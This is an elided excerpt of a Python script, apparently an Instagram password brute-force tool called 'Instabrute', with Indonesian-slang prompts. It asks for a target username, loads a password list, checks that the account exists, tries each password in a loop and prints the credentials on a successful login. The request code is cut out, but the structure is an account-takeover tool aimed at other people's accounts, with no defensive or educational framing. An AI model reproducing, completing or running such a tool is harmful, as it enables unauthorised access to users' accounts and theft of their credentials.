...
class Instabrute():
		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('[*] %s Berhasil Mengambil Password' % passwordsNumber)
				else:
	...
	def IsUserExists(self):
		...
		if (r.status_code == 404):
			print ('[*] Usernamenya "%s" Kaga Ada' % username)
...
instabrute = Instabrute(Input('Masukin Username Target: '))

try:
	delayLoop = int(Input('[*]Sabar Coeg Bentar Doang (Orang Sabar DiSayang Tuhan): ')) 
except Exception as e:
	print ('[*] Error, Jangan Pencet Apa"coeg "4"')
	delayLoop = 4
print ('')
...
for password in instabrute.passwords:
	...
	if sess:
		print ('[*] Berhasil Login %s' % [instabrute.username,password])
	else:
	...
	try:
		...
		WantToExit = str(Input('Pilih  y/n Untuk Keluar: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YA'):
			exit()
		else:
			continue
